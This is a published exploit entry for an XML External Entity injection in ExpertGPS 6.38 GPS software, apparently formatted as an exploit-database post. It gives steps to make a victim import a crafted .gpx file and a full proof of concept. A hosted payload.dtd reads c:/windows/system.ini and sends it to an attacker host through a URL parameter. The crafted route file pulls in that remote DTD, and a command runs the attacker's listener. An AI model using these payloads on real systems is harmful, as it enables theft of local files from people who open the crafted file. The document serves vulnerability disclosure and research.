@@ -1,0 +1,97 @@
+[+] Exploit Title: ExpertGPS 6.38 - XML External Entity Injection
+[+] Date: 2019-12-07
+[+] Exploit Author: Trent Gordon
+[+] Vendor Homepage: https://www.topografix.com/
+[+] Software Link: http://download.expertgps.com/SetupExpertGPS.exe
+[+] Disclosed at: 7FEB2020
+[+] Version: 6.38
+[+] Tested on: Windows 10
+[+] CVE: N/A
+ 
+==================
+Background:
+==================
+ExpertGPS 6.38 is GPS software, distributed by TopoGrafix, that is designed to sync with commercial off-the-shelf GPS devices (Garmin, Magellin, etc.) and organize GPS waypoint data.  One of the main file formats for saving GPS data is the .gpx format which is based on XML. 
+ 
+==================
+Vulnerability:
+==================
+By having a user import a crafted .gpx file (XML Based GPS data file), it is possible to execute a XXE injection which retrieves local files and exfiltrates them to a remote attacker.
+1.)Open ExpertGPS.exe
+2.)Select File -> Import Data from Other Programs...
+3.)Select the crafted route.gpx file (with listener open on ATTACKERS-IP) and click "Open".
+ 
+==================
+Proof of Concept:
+==================
+ 
+a.) python -m SimpleHTTPServer 9999 (listening on ATTACKERS-IP and hosting payload.dtd)
+ 
+b.) Hosted "payload.dtd"
+ 
+<?xml version="1.0" encoding="utf-8" ?>
+<!ENTITY % data SYSTEM "file:///c:/windows/system.ini">
+<!ENTITY % param1 "<!ENTITY &#x25; exfil SYSTEM 'http://ATTACKERS-IP?%data;'>">
+ 
+ 
+c.) Exploited "route.xml"
+ 
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE data [
+<!ENTITY % sp SYSTEM "http://ATTACKERS-IP:9999/payload.dtd">
+%sp;
+%param1;
+%exfil;
+]>
+<gpx xmlns="http://www.topografix.com/GPX/1/1" version="1.1" creator="ExpertGPS 6.38 using Garmin Colorado 400t" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:wptx1="http://www.garmin.com/xmlschemas/WaypointExtension/v1" xmlns:gpxx="http://www.garmin.com/xmlschemas/GpxExtensions/v3" xsi:schemaLocation="http://www.topografix.com/GPX/1/1 http://www.topografix.com/GPX/1/1/gpx.xsd http://www.topografix.com/GPX/gpx_overlay/0/3 http://www.topografix.com/GPX/gpx_overlay/0/3/gpx_overlay.xsd http://www.topografix.com/GPX/gpx_modified/0/1 http://www.topografix.com/GPX/gpx_modified/0/1/gpx_modified.xsd http://www.topografix.com/GPX/Private/TopoGrafix/0/4 http://www.topografix.com/GPX/Private/TopoGrafix/0/4/topografix.xsd http://www.garmin.com/xmlschemas/WaypointExtension/v1 http://www8.garmin.com/xmlschemas/WaypointExtensionv1.xsd http://www.garmin.com/xmlschemas/GpxExtensions/v3 http://www.garmin.com/xmlschemas/GpxExtensionsv3.xsd">
+<metadata>
+<bounds minlat="38.89767500" minlon="-77.03654700" maxlat="38.89767500" maxlon="-77.03654700"/>
+<extensions>
+<time xmlns="http://www.topografix.com/GPX/gpx_modified/0/1">2019-12-08T03:35:44.731Z</time>
+<active_point xmlns="http://www.topografix.com/GPX/Private/TopoGrafix/0/4" lat="38.89767500" lon="-77.03654700">
+</active_point>
+</extensions>
+</metadata>
+<wpt lat="38.89767500" lon="-77.03654700">
+<time>2019-12-08T03:35:44.732Z</time>
+<name>1600PennsylvaniaAvenuenWashingt</name>
+<cmt>1600 Pennsylvania Avenue
+Washington</cmt>
+<desc>1600 Pennsylvania Avenue
+Washington, DC 20500</desc>
+<sym>City (Small)</sym>
+<type>Address</type>
+<extensions>
+<label xmlns="http://www.topografix.com/GPX/gpx_overlay/0/3">
+<label_text>1600 Pennsylvania Avenue
+Washington, DC 20500</label_text>
+</label>
+<gpxx:WaypointExtension>
+<gpxx:Address>
+<gpxx:StreetAddress>1600 Pennsylvania Avenue</gpxx:StreetAddress>
+<gpxx:City>Washington</gpxx:City>
+<gpxx:State>DC</gpxx:State>
+<gpxx:Country>United States</gpxx:Country>
+<gpxx:PostalCode>20500</gpxx:PostalCode>
+</gpxx:Address>
+</gpxx:WaypointExtension>
+<wptx1:WaypointExtension>
+<wptx1:Address>
+<wptx1:StreetAddress>1600 Pennsylvania Avenue</wptx1:StreetAddress>
+<wptx1:City>Washington</wptx1:City>
+<wptx1:State>DC</wptx1:State>
+<wptx1:Country>United States</wptx1:Country>
+<wptx1:PostalCode>20500</wptx1:PostalCode>
+</wptx1:Address>
+</wptx1:WaypointExtension>
+</extensions>
+</wpt>
+<extensions>
+</extensions>
+</gpx>
+
+
+==================
+Additional Attack Vectors:
+==================
+There are numerous places in the software that allow for importing/opening a .gpx file.  I did not test them all, but I strongly suspect them to all rely upon the same misconfigured XML Parser, and therefore be vulnerable to XXE.
